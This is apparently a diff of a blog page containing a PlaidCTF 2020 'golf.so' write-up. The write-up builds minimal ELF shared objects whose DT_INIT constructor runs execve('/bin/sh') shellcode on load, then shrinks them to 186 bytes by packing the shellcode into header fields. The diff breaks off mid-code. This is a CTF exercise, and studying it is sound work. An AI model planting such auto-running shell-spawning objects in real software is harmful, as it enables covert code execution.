-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#ae81ff>0x1000</span>                  <span style=color:#75715e>; p_align
-</span><span style=color:#75715e></span>
-shell:
-        <span style=color:#75715e>; execve(&#34;/bin/sh&#34;, [&#34;/bin/sh&#34;])
-</span><span style=color:#75715e></span>        <span style=color:#a6e22e>mov</span>  <span style=color:#66d9ef>rdi</span>, <span style=color:#ae81ff>0x68732f6e69622f</span>
-        <span style=color:#a6e22e>push</span> <span style=color:#66d9ef>rdi</span>
-        <span style=color:#a6e22e>push</span> <span style=color:#66d9ef>rsp</span>
-        <span style=color:#a6e22e>pop</span>  <span style=color:#66d9ef>rdi</span>
-        <span style=color:#a6e22e>push</span> <span style=color:#ae81ff>59</span>
-        <span style=color:#a6e22e>pop</span>  <span style=color:#66d9ef>rax</span>
-
-        <span style=color:#75715e>; Adjust stack address for argv array
-</span><span style=color:#75715e></span>        <span style=color:#a6e22e>push</span> <span style=color:#ae81ff>0</span>
-        <span style=color:#a6e22e>push</span> <span style=color:#66d9ef>rdi</span>
-        <span style=color:#a6e22e>mov</span>  <span style=color:#66d9ef>rsi</span>, <span style=color:#66d9ef>rsp</span>
-        <span style=color:#a6e22e>cdq</span>
-        <span style=color:#a6e22e>syscall</span>
-
-dynamic:
-  dt_init:
-        <span style=color:#a6e22e>dq</span>  <span style=color:#ae81ff>0xc</span>, <span style=color:#66d9ef>shell</span>
-  dt_strtab:
-        <span style=color:#a6e22e>dq</span>  <span style=color:#ae81ff>0x5</span>, <span style=color:#66d9ef>shell</span>
-  dt_symtab:
-        <span style=color:#a6e22e>dq</span>  <span style=color:#ae81ff>0x6</span>, <span style=color:#66d9ef>shell</span>
-<span style=color:#a6e22e>dynsize</span>  <span style=color:#66d9ef>equ</span>  <span style=color:#66d9ef>$</span> - <span style=color:#66d9ef>dynamic</span>
-
-<span style=color:#a6e22e>progsize</span>  <span style=color:#66d9ef>equ</span>  <span style=color:#66d9ef>$</span> - <span style=color:#66d9ef>$$</span>
-</code></pre></div><p>The most difficult part of this challenge was determining the minimum valid contents needed for populating the dynamic segment.
+In fact, the PT_DYNAMIC metadata is where we can indicate that a function is a global constructor by adding a DT_INIT entry.</p><p>Since segments can overlap, we can stick the PT_DYNAMIC segment inside of the already defined PT_LOAD one.
+We just need to define a second program header and add the minimum required contents.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#a6e22e>BITS</span> <span style=color:#ae81ff>64</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>ehdr:                               <span style=color:#75715e>; Elf64_Ehdr
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#a6e22e>db</span>  <span style=color:#ae81ff>0x7f</span>, <span style=color:#960050;background-color:#1e0010>&#34;</span><span style=color:#66d9ef>ELF</span><span style=color:#960050;background-color:#1e0010>&#34;</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span> <span style=color:#75715e>; e_ident
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>times</span> <span style=color:#ae81ff>8</span> <span style=color:#66d9ef>db</span>  <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>dw</span>  <span style=color:#ae81ff>3</span>                       <span style=color:#75715e>; e_type
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dw</span>  <span style=color:#ae81ff>0x3e</span>                    <span style=color:#75715e>; e_machine
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dd</span>  <span style=color:#ae81ff>1</span>                       <span style=color:#75715e>; e_version
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#66d9ef>shell</span>                   <span style=color:#75715e>; e_entry
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#66d9ef>phdr</span> - <span style=color:#66d9ef>$$</span>               <span style=color:#75715e>; e_phoff
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#ae81ff>0</span>                       <span style=color:#75715e>; e_shoff
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dd</span>  <span style=color:#ae81ff>0</span>                       <span style=color:#75715e>; e_flags
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dw</span>  <span style=color:#66d9ef>ehdrsize</span>                <span style=color:#75715e>; e_ehsize
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dw</span>  <span style=color:#66d9ef>phdrsize</span>                <span style=color:#75715e>; e_phentsize
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dw</span>  <span style=color:#ae81ff>2</span>                       <span style=color:#75715e>; e_phnum
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dw</span>  <span style=color:#ae81ff>0</span>                       <span style=color:#75715e>; e_shentsize
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dw</span>  <span style=color:#ae81ff>0</span>                       <span style=color:#75715e>; e_shnum
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dw</span>  <span style=color:#ae81ff>0</span>                       <span style=color:#75715e>; e_shstrndx
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>ehdrsize</span>  <span style=color:#66d9ef>equ</span>  <span style=color:#66d9ef>$</span> - <span style=color:#66d9ef>ehdr</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>phdr:                               <span style=color:#75715e>; Elf64_Phdr
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#a6e22e>dd</span>  <span style=color:#ae81ff>1</span>                       <span style=color:#75715e>; p_type
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dd</span>  <span style=color:#ae81ff>7</span>                       <span style=color:#75715e>; p_flags
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#ae81ff>0</span>                       <span style=color:#75715e>; p_offset
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#66d9ef>$$</span>                      <span style=color:#75715e>; p_vaddr
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#66d9ef>$$</span>                      <span style=color:#75715e>; p_paddr
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#66d9ef>progsize</span>                <span style=color:#75715e>; p_filesz
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#66d9ef>progsize</span>                <span style=color:#75715e>; p_memsz
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#ae81ff>0x1000</span>                  <span style=color:#75715e>; p_align
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>phdrsize</span>  <span style=color:#66d9ef>equ</span>  <span style=color:#66d9ef>$</span> - <span style=color:#66d9ef>phdr</span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e>; PT_DYNAMIC segment
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#a6e22e>dd</span>  <span style=color:#ae81ff>2</span>                       <span style=color:#75715e>; p_type
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dd</span>  <span style=color:#ae81ff>7</span>                       <span style=color:#75715e>; p_flags
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#66d9ef>dynamic</span>                 <span style=color:#75715e>; p_offset
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#66d9ef>dynamic</span>                 <span style=color:#75715e>; p_vaddr
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#66d9ef>dynamic</span>                 <span style=color:#75715e>; p_paddr
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#66d9ef>dynsize</span>                 <span style=color:#75715e>; p_filesz
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#66d9ef>dynsize</span>                 <span style=color:#75715e>; p_memsz
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#ae81ff>0x1000</span>                  <span style=color:#75715e>; p_align
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>shell:
+</span></span><span style=display:flex><span>        <span style=color:#75715e>; execve(&#34;/bin/sh&#34;, [&#34;/bin/sh&#34;])
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#a6e22e>mov</span>  <span style=color:#66d9ef>rdi</span>, <span style=color:#ae81ff>0x68732f6e69622f</span>
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>push</span> <span style=color:#66d9ef>rdi</span>
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>push</span> <span style=color:#66d9ef>rsp</span>
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>pop</span>  <span style=color:#66d9ef>rdi</span>
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>push</span> <span style=color:#ae81ff>59</span>
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>pop</span>  <span style=color:#66d9ef>rax</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e>; Adjust stack address for argv array
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#a6e22e>push</span> <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>push</span> <span style=color:#66d9ef>rdi</span>
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>mov</span>  <span style=color:#66d9ef>rsi</span>, <span style=color:#66d9ef>rsp</span>
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>cdq</span>
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>syscall</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>dynamic:
+</span></span><span style=display:flex><span>  dt_init:
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>dq</span>  <span style=color:#ae81ff>0xc</span>, <span style=color:#66d9ef>shell</span>
+</span></span><span style=display:flex><span>  dt_strtab:
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>dq</span>  <span style=color:#ae81ff>0x5</span>, <span style=color:#66d9ef>shell</span>
+</span></span><span style=display:flex><span>  dt_symtab:
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>dq</span>  <span style=color:#ae81ff>0x6</span>, <span style=color:#66d9ef>shell</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>dynsize</span>  <span style=color:#66d9ef>equ</span>  <span style=color:#66d9ef>$</span> - <span style=color:#66d9ef>dynamic</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>progsize</span>  <span style=color:#66d9ef>equ</span>  <span style=color:#66d9ef>$</span> - <span style=color:#66d9ef>$$</span>
+</span></span></code></pre></div><p>The most difficult part of this challenge was determining the minimum valid contents needed for populating the dynamic segment.
 The global constructor table that we used earlier to execute our shellcode is the important DT_INIT entry.
-Despite the fact that there is no symbol table in the binary, the interpreter still requires that DT_STRTAB and DT_SYMTAB entries be present.</p>
-<p>Lastly, we had to make a minor change to the shellcode in order to get the server to accept the binary.
+Despite the fact that there is no symbol table in the binary, the interpreter still requires that DT_STRTAB and DT_SYMTAB entries be present.</p><p>Lastly, we had to make a minor change to the shellcode in order to get the server to accept the binary.
 The original version worked but the server insisted that the second argument had to point to the <code>argv</code> array on the stack.
-This program comes in at 255 bytes, which is small enough for the first flag.</p>
-<h2 id=optimization>Optimization</h2>
-<p>In order to get the second flag, we need to remove even more bytes from our binary.
-We can do this with some trial and error by removing fields and seeing if the program still functions.</p>
-<ul>
-<li>The <code>e_shentsize</code>, <code>e_shnum</code> and <code>e_shstrndx</code> can be removed entirely with no side-effects since there are no section headers or symbol table.</li>
-<li>We can remove half the contents of the PT_DYNAMIC program header without crashing the program.</li>
-<li>The PT_LOAD segment cannot be shortened since the interpreter spits out an error about the program header size being wrong.</li>
-</ul>
-<p>The final thing we can do is split our shellcode up into multiple stages and fill in the empty gaps.</p>
-<ul>
-<li>The <code>e_shoff</code> and <code>e_flags</code> fields take up 12 empty bytes in the ELF header.</li>
-<li>The <code>p_paddr</code> and <code>p_filesz</code> fields in the loadable segment take up 16 bytes.</li>
-</ul>
-<p>Using an <a href=https://defuse.ca/online-x86-assembler.htm>online disassembler</a>, we can count bytes as we try to minimize the shellcode.
+This program comes in at 255 bytes, which is small enough for the first flag.</p><h2 id=optimization>Optimization</h2><p>In order to get the second flag, we need to remove even more bytes from our binary.
+We can do this with some trial and error by removing fields and seeing if the program still functions.</p><ul><li>The <code>e_shentsize</code>, <code>e_shnum</code> and <code>e_shstrndx</code> can be removed entirely with no side-effects since there are no section headers or symbol table.</li><li>We can remove half the contents of the PT_DYNAMIC program header without crashing the program.</li><li>The PT_LOAD segment cannot be shortened since the interpreter spits out an error about the program header size being wrong.</li></ul><p>The final thing we can do is split our shellcode up into multiple stages and fill in the empty gaps.</p><ul><li>The <code>e_shoff</code> and <code>e_flags</code> fields take up 12 empty bytes in the ELF header.</li><li>The <code>p_paddr</code> and <code>p_filesz</code> fields in the loadable segment take up 16 bytes.</li></ul><p>Using an <a href=https://defuse.ca/online-x86-assembler.htm>online disassembler</a>, we can count bytes as we try to minimize the shellcode.
 We can fit the &ldquo;/bin/sh&rdquo; string followed by a short jump to stage 2 perfectly into the empty space in the ELF header.
 Stage 2 fits into the 16 bytes in the program header.
-Through these optimizations we have eliminated the entire code section and moved it into the headers to give us the following:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=color:#a6e22e>BITS</span> <span style=color:#ae81ff>64</span>
-
-ehdr:                               <span style=color:#75715e>; Elf64_Ehdr
-</span><span style=color:#75715e></span>        <span style=color:#a6e22e>db</span>  <span style=color:#ae81ff>0x7f</span>, <span style=color:#960050;background-color:#1e0010>&#34;</span><span style=color:#66d9ef>ELF</span><span style=color:#960050;background-color:#1e0010>&#34;</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span> <span style=color:#75715e>; e_ident
-</span><span style=color:#75715e></span><span style=color:#66d9ef>times</span> <span style=color:#ae81ff>8</span> <span style=color:#66d9ef>db</span>  <span style=color:#ae81ff>0</span>
-        <span style=color:#a6e22e>dw</span>  <span style=color:#ae81ff>3</span>                       <span style=color:#75715e>; e_type
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dw</span>  <span style=color:#ae81ff>0x3e</span>                    <span style=color:#75715e>; e_machine
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dd</span>  <span style=color:#ae81ff>1</span>                       <span style=color:#75715e>; e_version
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#66d9ef>stage1</span>                  <span style=color:#75715e>; e_entry
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#66d9ef>phdr</span> - <span style=color:#66d9ef>$$</span>               <span style=color:#75715e>; e_phoff
-</span><span style=color:#75715e></span><span style=color:#66d9ef>stage1</span>: <span style=color:#75715e>; 12 bytes
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>mov</span> <span style=color:#66d9ef>rdi</span>, <span style=color:#ae81ff>0x68732f6e69622f</span>  <span style=color:#75715e>; 10 bytes
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>jmp</span> <span style=color:#66d9ef>stage2</span>  <span style=color:#75715e>; 2 bytes
-</span><span style=color:#75715e></span>
-        <span style=color:#a6e22e>dw</span>  <span style=color:#66d9ef>ehdrsize</span>                <span style=color:#75715e>; e_ehsize
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dw</span>  <span style=color:#66d9ef>phdrsize</span>                <span style=color:#75715e>; e_phentsize
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dw</span>  <span style=color:#ae81ff>2</span>                       <span style=color:#75715e>; e_phnum
-</span><span style=color:#75715e></span><span style=color:#66d9ef>ehdrsize</span>  <span style=color:#66d9ef>equ</span>  <span style=color:#66d9ef>$</span> - <span style=color:#66d9ef>ehdr</span>
-
-phdr:                               <span style=color:#75715e>; Elf64_Phdr
-</span><span style=color:#75715e></span>        <span style=color:#a6e22e>dd</span>  <span style=color:#ae81ff>1</span>                       <span style=color:#75715e>; p_type
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dd</span>  <span style=color:#ae81ff>7</span>                       <span style=color:#75715e>; p_flags
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#ae81ff>0</span>                       <span style=color:#75715e>; p_offset
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#66d9ef>$$</span>                      <span style=color:#75715e>; p_vaddr
-</span><span style=color:#75715e></span><span style=color:#66d9ef>stage2</span>: <span style=color:#75715e>; 16 bytes
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>xor</span> <span style=color:#66d9ef>rax</span>, <span style=color:#66d9ef>rax</span>  <span style=color:#75715e>; 3
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>push</span> <span style=color:#66d9ef>rdi</span>  <span style=color:#75715e>; 1
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>push</span> <span style=color:#66d9ef>rsp</span>  <span style=color:#75715e>; 1
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>pop</span> <span style=color:#66d9ef>rdi</span>   <span style=color:#75715e>; 1
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>push</span> <span style=color:#ae81ff>0</span>    <span style=color:#75715e>; 1
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>push</span> <span style=color:#66d9ef>rdi</span>  <span style=color:#75715e>; 1
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>mov</span> <span style=color:#66d9ef>rsi</span>, <span style=color:#66d9ef>rsp</span>  <span style=color:#75715e>; 3
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>mov</span> <span style=color:#66d9ef>al</span>, <span style=color:#ae81ff>59</span>  <span style=color:#75715e>; 2
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>syscall</span>  <span style=color:#75715e>; 2
-</span><span style=color:#75715e></span>
-        <span style=color:#a6e22e>dq</span>  <span style=color:#66d9ef>progsize</span>                <span style=color:#75715e>; p_memsz
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#ae81ff>0x1000</span>                  <span style=color:#75715e>; p_align
-</span><span style=color:#75715e></span><span style=color:#66d9ef>phdrsize</span>  <span style=color:#66d9ef>equ</span>  <span style=color:#66d9ef>$</span> - <span style=color:#66d9ef>phdr</span>
-        <span style=color:#a6e22e>dd</span>  <span style=color:#ae81ff>2</span>                       <span style=color:#75715e>; p_type
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dd</span>  <span style=color:#ae81ff>7</span>                       <span style=color:#75715e>; p_flags
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#66d9ef>dynamic</span>                 <span style=color:#75715e>; p_offset
-</span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#66d9ef>dynamic</span>                 <span style=color:#75715e>; p_vaddr
-</span><span style=color:#75715e></span>
-dynamic:
-  dt_init:
-        <span style=color:#a6e22e>dq</span>  <span style=color:#ae81ff>0xc</span>, <span style=color:#66d9ef>stage1</span>
-  dt_strtab:
-        <span style=color:#a6e22e>dq</span>  <span style=color:#ae81ff>0x5</span>, <span style=color:#66d9ef>stage1</span>
-  dt_symtab:
-        <span style=color:#a6e22e>dq</span>  <span style=color:#ae81ff>0x6</span>, <span style=color:#66d9ef>stage1</span>
-<span style=color:#a6e22e>dynsize</span>  <span style=color:#66d9ef>equ</span>  <span style=color:#66d9ef>$</span> - <span style=color:#66d9ef>dynamic</span>
-
-<span style=color:#a6e22e>progsize</span>  <span style=color:#66d9ef>equ</span>  <span style=color:#66d9ef>$</span> - <span style=color:#66d9ef>$$</span>
-</code></pre></div><p>This produces a binary of 186 bytes.</p>
-<p><img src=https://raw.githubusercontent.com/starfleetcadet75/writeups/master/2020-PlaidCTF/golf.so/flags.png alt=flags></p>
-</div>
-<footer class=post-footer>
-<div class=post-footer-data>
-<div class=tags>
-<div class=tag>
-<a href=/tags/programming>#programming</a>
-</div>
-</div>
-<div class=post-footer-meta>Permalink: <a href=https://starfleetcadet75.github.io/posts/plaid-2020-golf-so/>/posts/plaid-2020-golf-so/</a> | Date: 2020-04-20 </div>
-<hr>
-<div class=categories>
-Published in:
-<div class=category>
-<a href=/categories/writeups>writeups</a>
-</div>
-</div>
-<div class=series>
-</div>
-</div>
-</footer>
-</article>
-<footer>
-<div class=social-links-footer>
-<a href=mailto:starfleetcadet75@gmail.com><div class=social-link>Email</div></a>
-<a href=https://github.com/starfleetcadet75 target=_blank><div class=social-link>GitHub</div></a>
-<a href=https://gitlab.com/starfleetcadet75 target=_blank><div class=social-link>GitLab</div></a>
-<div class=social-link>
-<a href=https://starfleetcadet75.github.io/index.xml target=_blank>RSS</a>
-</div>
-</div>
-<div class=copyright> </div>
-<div class=poweredby>
-Powered by <a href=https://gohugo.io/>Hugo</a>.
-</div>
-</footer>
-</div>
-</body>
-</html>
+Through these optimizations we have eliminated the entire code section and moved it into the headers to give us the following:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#a6e22e>BITS</span> <span style=color:#ae81ff>64</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>ehdr:                               <span style=color:#75715e>; Elf64_Ehdr
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#a6e22e>db</span>  <span style=color:#ae81ff>0x7f</span>, <span style=color:#960050;background-color:#1e0010>&#34;</span><span style=color:#66d9ef>ELF</span><span style=color:#960050;background-color:#1e0010>&#34;</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span> <span style=color:#75715e>; e_ident
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>times</span> <span style=color:#ae81ff>8</span> <span style=color:#66d9ef>db</span>  <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>dw</span>  <span style=color:#ae81ff>3</span>                       <span style=color:#75715e>; e_type
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dw</span>  <span style=color:#ae81ff>0x3e</span>                    <span style=color:#75715e>; e_machine
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dd</span>  <span style=color:#ae81ff>1</span>                       <span style=color:#75715e>; e_version
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#66d9ef>stage1</span>                  <span style=color:#75715e>; e_entry
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#66d9ef>phdr</span> - <span style=color:#66d9ef>$$</span>               <span style=color:#75715e>; e_phoff
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>stage1</span>: <span style=color:#75715e>; 12 bytes
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>mov</span> <span style=color:#66d9ef>rdi</span>, <span style=color:#ae81ff>0x68732f6e69622f</span>  <span style=color:#75715e>; 10 bytes
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>jmp</span> <span style=color:#66d9ef>stage2</span>  <span style=color:#75715e>; 2 bytes
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>dw</span>  <span style=color:#66d9ef>ehdrsize</span>                <span style=color:#75715e>; e_ehsize
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dw</span>  <span style=color:#66d9ef>phdrsize</span>                <span style=color:#75715e>; e_phentsize
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dw</span>  <span style=color:#ae81ff>2</span>                       <span style=color:#75715e>; e_phnum
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>ehdrsize</span>  <span style=color:#66d9ef>equ</span>  <span style=color:#66d9ef>$</span> - <span style=color:#66d9ef>ehdr</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>phdr:                               <span style=color:#75715e>; Elf64_Phdr
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#a6e22e>dd</span>  <span style=color:#ae81ff>1</span>                       <span style=color:#75715e>; p_type
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dd</span>  <span style=color:#ae81ff>7</span>                       <span style=color:#75715e>; p_flags
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#ae81ff>0</span>                       <span style=color:#75715e>; p_offset
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#66d9ef>$$</span>                      <span style=color:#75715e>; p_vaddr
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>stage2</span>: <span style=color:#75715e>; 16 bytes
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>xor</span> <span style=color:#66d9ef>rax</span>, <span style=color:#66d9ef>rax</span>  <span style=color:#75715e>; 3
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>push</span> <span style=color:#66d9ef>rdi</span>  <span style=color:#75715e>; 1
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>push</span> <span style=color:#66d9ef>rsp</span>  <span style=color:#75715e>; 1
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>pop</span> <span style=color:#66d9ef>rdi</span>   <span style=color:#75715e>; 1
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>push</span> <span style=color:#ae81ff>0</span>    <span style=color:#75715e>; 1
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>push</span> <span style=color:#66d9ef>rdi</span>  <span style=color:#75715e>; 1
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>mov</span> <span style=color:#66d9ef>rsi</span>, <span style=color:#66d9ef>rsp</span>  <span style=color:#75715e>; 3
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>mov</span> <span style=color:#66d9ef>al</span>, <span style=color:#ae81ff>59</span>  <span style=color:#75715e>; 2
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>syscall</span>  <span style=color:#75715e>; 2
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>dq</span>  <span style=color:#66d9ef>progsize</span>                <span style=color:#75715e>; p_memsz
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#ae81ff>0x1000</span>                  <span style=color:#75715e>; p_align
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>phdrsize</span>  <span style=color:#66d9ef>equ</span>  <span style=color:#66d9ef>$</span> - <span style=color:#66d9ef>phdr</span>
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>dd</span>  <span style=color:#ae81ff>2</span>                       <span style=color:#75715e>; p_type
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dd</span>  <span style=color:#ae81ff>7</span>                       <span style=color:#75715e>; p_flags
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#66d9ef>dynamic</span>                 <span style=color:#75715e>; p_offset
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>dq</span>  <span style=color:#66d9ef>dynamic</span>                 <span style=color:#75715e>; p_vaddr
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>dynamic:
+</span></span><span style=display:flex><span>  dt_init:
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>dq</span>  <span style=color:#ae81ff>0xc</span>, <span style=color:#66d9ef>stage1</span>
+</span></span><span style=display:flex><span>  dt_strtab:
